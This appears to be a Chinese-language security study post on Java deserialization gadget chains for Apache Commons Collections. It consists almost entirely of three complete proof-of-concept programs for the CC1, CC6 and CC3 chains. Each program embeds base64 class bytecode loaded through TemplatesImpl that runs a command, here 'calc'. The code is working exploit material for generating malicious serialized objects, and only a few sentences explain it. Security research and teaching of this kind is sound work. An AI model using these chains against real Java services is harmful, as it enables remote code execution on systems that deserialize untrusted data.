CC3和CC1.6最主要的区别在于，CC1和6使用Runtime#exec执行命令，CC3加入了动态加载字节码的方式执行命令，整体的调用链并没有太大区别

我们现在看下CC1,6结合TemplatesImpl类动态加载字节码的形式

### CC1,6 with TemplatesImpl

CC1

```java
package org.example;

import java.lang.annotation.Retention;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;


import java.io.*;
import java.lang.reflect.*;
//import sun.reflect.annotation.AnnotationInvocationHandler;
import java.util.Arrays;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class CC1_lazy {
    public static  void main(String[] args) throws Exception {

        TemplatesImpl impl = new TemplatesImpl();
        byte[] code = Base64.getDecoder().decode("yv66vgAAADQAKgoABgAdCgAeAB8IACAKAB4AIQcAIgcAIwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAXTG9yZy9leGFtcGxlL2NsYXNzY29kZTsBAApFeGNlcHRpb25zBwAkAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADmNsYXNzY29kZS5qYXZhDAAHAAgHACUMACYAJwEABGNhbGMMACgAKQEAFW9yZy9leGFtcGxlL2NsYXNzY29kZQEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABgAAAAAAAwABAAcACAACAAkAAABAAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAIACgAAAA4AAwAAAAsABAAMAA0ADQALAAAADAABAAAADgAMAA0AAAAOAAAABAABAA8AAQAQABEAAQAJAAAAPwAAAAMAAAABsQAAAAIACgAAAAYAAQAAABAACwAAACAAAwAAAAEADAANAAAAAAABABIAEwABAAAAAQAUABUAAgABABAAFgABAAkAAABJAAAABAAAAAGxAAAAAgAKAAAABgABAAAAEwALAAAAKgAEAAAAAQAMAA0AAAAAAAEAEgATAAEAAAABABcAGAACAAAAAQAZABoAAwABABsAAAACABw=");
        setFieldValue(impl, "_name", "uu2fu3o");
        setFieldValue(impl, "_bytecodes", new byte[][]{code});
        setFieldValue(impl, "_class", null);
        setFieldValue(impl, "_tfactory", new TransformerFactoryImpl());
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(impl),
                new InvokerTransformer("newTransformer",null, null)
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        // 创建Map对象
        Map map = new HashMap();
        Map lazy = LazyMap.decorate(map,chainedTransformer);
        String classname = "sun.reflect.annotation.AnnotationInvocationHandler";
        Class reClass = Class.forName(classname);
        Constructor constructor = reClass.getDeclaredConstructor(Class.class,Map.class);
        constructor.setAccessible(true);

        //这里第一个参数必须是注释类型的
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Retention.class, lazy);

        // 创建 AnnotationInvocationHandler 的代理
        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler);

        //proxyMap.size();
        //再实例化一个 AnnotationInvocationHandler 包裹我们的代理对象 proxyMap
        handler = (InvocationHandler) constructor.newInstance(Retention.class, proxyMap);
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream out = new ObjectOutputStream(baos);
        out.writeObject(handler);
        out.flush();
        out.close();
        byte[] bytes = baos.toByteArray();
        ByteArrayInputStream bais = new ByteArrayInputStream(bytes);
        ObjectInputStream in = new ObjectInputStream(bais);
        in.readObject();
    }
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
}

```

CC6

```java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.util.*;

import org.apache.commons.collections.map.LazyMap;

public class CC6 {
    public static void main(String[] args) throws Exception {

        TemplatesImpl impl = new TemplatesImpl();
        byte[] code = Base64.getDecoder().decode("yv66vgAAADQAKgoABgAdCgAeAB8IACAKAB4AIQcAIgcAIwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAXTG9yZy9leGFtcGxlL2NsYXNzY29kZTsBAApFeGNlcHRpb25zBwAkAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADmNsYXNzY29kZS5qYXZhDAAHAAgHACUMACYAJwEABGNhbGMMACgAKQEAFW9yZy9leGFtcGxlL2NsYXNzY29kZQEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABgAAAAAAAwABAAcACAACAAkAAABAAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAIACgAAAA4AAwAAAAsABAAMAA0ADQALAAAADAABAAAADgAMAA0AAAAOAAAABAABAA8AAQAQABEAAQAJAAAAPwAAAAMAAAABsQAAAAIACgAAAAYAAQAAABAACwAAACAAAwAAAAEADAANAAAAAAABABIAEwABAAAAAQAUABUAAgABABAAFgABAAkAAABJAAAABAAAAAGxAAAAAgAKAAAABgABAAAAEwALAAAAKgAEAAAAAQAMAA0AAAAAAAEAEgATAAEAAAABABcAGAACAAAAAQAZABoAAwABABsAAAACABw=");
        setFieldValue(impl, "_name", "uu2fu3o");
        setFieldValue(impl, "_bytecodes", new byte[][]{code});
        setFieldValue(impl, "_class", null);
        setFieldValue(impl, "_tfactory", new TransformerFactoryImpl());
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(impl),
                new InvokerTransformer("newTransformer",null, null)
        };
        Transformer[] fakeformer = new Transformer[]{};
        //ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        ChainedTransformer fakechain = new ChainedTransformer(fakeformer);
        Map map1 = new HashMap();
        Map lazy = LazyMap.decorate(map1,fakechain);
        //获取TiedMapEntry类
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazy, "1");
        //tiedMapEntry.hashCode();
        HashMap hashMap = new HashMap();
        hashMap.put(tiedMapEntry,"2");
        lazy.remove("1");
        //反射修改，将恶意链修改回去
        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(fakechain, transformers);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();

        ObjectOutputStream out = new ObjectOutputStream(baos);

        out.writeObject(hashMap);
        out.flush();
        out.close();

        byte[] bytes = baos.toByteArray();

//      System.out.println("Payload攻击字节数组：" + Arrays.toString(bytes));

        ByteArrayInputStream bais = new ByteArrayInputStream(bytes);

        ObjectInputStream in = new ObjectInputStream(bais);

        in.readObject();
    }
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
}


```

### CC3

CC3没有使用invokertransform,转而使用了InstantiateTransformer调用TrAXFilter构造函数中的newTransform的形式，这个我在CC4中有详细分析

```java
package org.example;

import java.lang.annotation.Retention;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;


import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.*;
//import sun.reflect.annotation.AnnotationInvocationHandler;
import java.util.Arrays;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class CC3 {
    public static  void main(String[] args) throws Exception {

        TemplatesImpl impl = new TemplatesImpl();
        byte[] code = Base64.getDecoder().decode("yv66vgAAADQAKgoABgAdCgAeAB8IACAKAB4AIQcAIgcAIwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAXTG9yZy9leGFtcGxlL2NsYXNzY29kZTsBAApFeGNlcHRpb25zBwAkAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADmNsYXNzY29kZS5qYXZhDAAHAAgHACUMACYAJwEABGNhbGMMACgAKQEAFW9yZy9leGFtcGxlL2NsYXNzY29kZQEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABgAAAAAAAwABAAcACAACAAkAAABAAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAIACgAAAA4AAwAAAAsABAAMAA0ADQALAAAADAABAAAADgAMAA0AAAAOAAAABAABAA8AAQAQABEAAQAJAAAAPwAAAAMAAAABsQAAAAIACgAAAAYAAQAAABAACwAAACAAAwAAAAEADAANAAAAAAABABIAEwABAAAAAQAUABUAAgABABAAFgABAAkAAABJAAAABAAAAAGxAAAAAgAKAAAABgABAAAAEwALAAAAKgAEAAAAAQAMAA0AAAAAAAEAEgATAAEAAAABABcAGAACAAAAAQAZABoAAwABABsAAAACABw=");
        setFieldValue(impl, "_name", "uu2fu3o");
        setFieldValue(impl, "_bytecodes", new byte[][]{code});
        setFieldValue(impl, "_class", null);
        setFieldValue(impl, "_tfactory", new TransformerFactoryImpl());
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{impl})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        // 创建Map对象
        Map map = new HashMap();
        Map lazy = LazyMap.decorate(map,chainedTransformer);
        String classname = "sun.reflect.annotation.AnnotationInvocationHandler";
        Class reClass = Class.forName(classname);
        Constructor constructor = reClass.getDeclaredConstructor(Class.class,Map.class);
        constructor.setAccessible(true);

        //这里第一个参数必须是注释类型的
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Retention.class, lazy);

        // 创建 AnnotationInvocationHandler 的代理
        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler);

        //proxyMap.size();
        //再实例化一个 AnnotationInvocationHandler 包裹我们的代理对象 proxyMap
        handler = (InvocationHandler) constructor.newInstance(Retention.class, proxyMap);
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream out = new ObjectOutputStream(baos);
        out.writeObject(handler);
        out.flush();
        out.close();
        byte[] bytes = baos.toByteArray();
        ByteArrayInputStream bais = new ByteArrayInputStream(bytes);
        ObjectInputStream in = new ObjectInputStream(bais);
        in.readObject();
    }
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
}

```

